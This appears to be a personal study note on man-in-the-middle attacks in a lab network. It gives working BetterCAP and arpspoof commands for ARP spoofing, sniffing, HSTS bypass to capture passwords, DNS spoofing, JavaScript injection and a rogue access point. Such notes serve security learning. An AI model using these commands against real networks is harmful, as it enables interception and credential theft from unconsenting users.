# Man in the middle (MITM) attack
-   hacker is in the middle of the connection

## ARP spoofing
-   ARP links IP addresses to MAC addresses
-   ARP is not secured and not verified
-   send from attacker machine response to gateway/router that he is the victim pc (gateway will link the ip for victim to the attacker mac address) and to the victim pc that he is a gateway (victim pc will link the mac of attacker to gateway ip)
-   possible programs to use: ARP spoof, BetterCAP
-   on attacker machine port forwarding has to be also enabled (to work as a router)

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward # enable forwarding 
```

### ARP spoof
```bash
# run for both targets at once (one against router, one against victim) and keep running for the whole attack
# example to victim (tell to victim I am a router)
arpspoof -i eth0 -t 192.168.72.128 192.168.72.2
# example to router (tell to router I am a victim)
arpspoof -i eth0 -t 192.168.72.2 192.168.72.128
```
-   `-i` interface
-   `-t` target network
-   at the end put ip address we want to be as attacker (router address od victim address)

### BetterCAP
```bash
bettercap -iface eth0 # -iface: interface which we want to run the attacks against
# inside bettercup run commands like "net.probe on" to discover all connected hosts to the network
# run "help command" example: "help net.probe" to show help for the command
```
-   arp spoofing inside BetterCAP:
    -   `net.probe` and `net.recon` has to be running
    -   to modify any option of the command, write `set option value`
```bash
net.probe on
net.recon on #probably already running if so, do not include inside caplet file mentioned bellow. Any error stops running the file
set arp.spoof.fullduplex true # run spoofing on both targets (router and victim) 
set arp.spoof.targets 192.168.72.128 # set targets (router is set automatically in fullduplex setting)
arp.spoof on # run the spoofing
```

#### Capture data while ARP spoofing with BetterCAP
-   BetterCAP can not only capture the data, but also it can analyze them (based on settings) and show the interesting data
```bash
net.sniff on
```

-   after closing BetterCAP everything has to be set manually again or "caplet" file can be created, to automatically run all the commands. Steps:
    1)  create * and write down all the commands
    2)  run BetterCAP with option `-caplets filename.cap`
    3)  there are many couplets predefined for BetterCAP and can be downloaded to specific location `/usr/local/share/bettercap/caplets`. To see them use `caplet.show`

-   for passwords to be seen, http will be seen. Therefor for https we have to make unsecure versions of the web pages. It can be done as bellow:
```bash
set net.sniff.local true # sniff all data even if it thinks it is local data
hstshijack/hstshijack # run caplet for https sniffing, downloaded as mentioned in 3)
```

#### HSTS attacks
-   modern browsers comes with list of pages, which should be loaded only through https
-   check is being done locally
-   only way to bypass this feature the victim will be forwarded to slightly different url (facebook.com = facebook.corn)
-   for facebook, instagram etc. this will only work if the page is opened from bypassed search engine like google.ie.
-   attack is the same as above, just the caplet should be modified to bypass the webpages. The result can be seen in the folder attachments/hstshijack
-   for Chrome works only if Secure DNS disabled (inside chrome settings)

### DNS spoofing
-   doesn't work against HSTS websites
-   routing in local network can be changed as mentioned in ARP spoofing
-   same can be done for routing out of the local network, so the victim can be redirected to any attackers website
-   kali Linux comes with webserver, to be able to run websites
```bash
service apache2 start # start webserver, it is running on same ip as the attacker machine (ifconfig)
```
-   website location is `/var/www/html`
-   to run the attack, run the ARP spoofing described above and:
```bash
set dns.spoof.all true # spoof all DNS requests, if not
set dns.spoof.domains test.com, *.test.com # specify which domains to spoof
dns.spoof on # start the module
```
- `dns.spoof.address` is set by default to interface address

### Basic JS code injection
-   it is possible to modify the response since the attacker is MITM
-   steps to code injection
-   works only on HTTP sites
    1)  again run all the ARP spoofing commands from above need to be run except the `hstshijack/hstshijack`
    2)  create *.js file
    3)  insert the created file path inside `hstshijack` option `set hstshijack.payloads` as `*:/path/to/file.js`
    4)  run command `hstshijack/hstshijack` in bettercap

### BetterCAP UI
-   BetterCAP provides also UI. Just run the bettercap on wanted interface `bettercap -iface eth0`
-   inside bettercap install the UI by `ui.update`
-   run the ui by `http-ui`. No open browser with ip shown inside the cmd
-   default login: user, pass

## Create a fake access point
-   to become a MITM it is also the way
-   how to:
    1)  create a hotspot: to do so, one of he tools is https://github.com/lakinduakash/linux-wifi-hotspot 
    2)  see the communication inside the wireshark / use attacks as previously mentioned

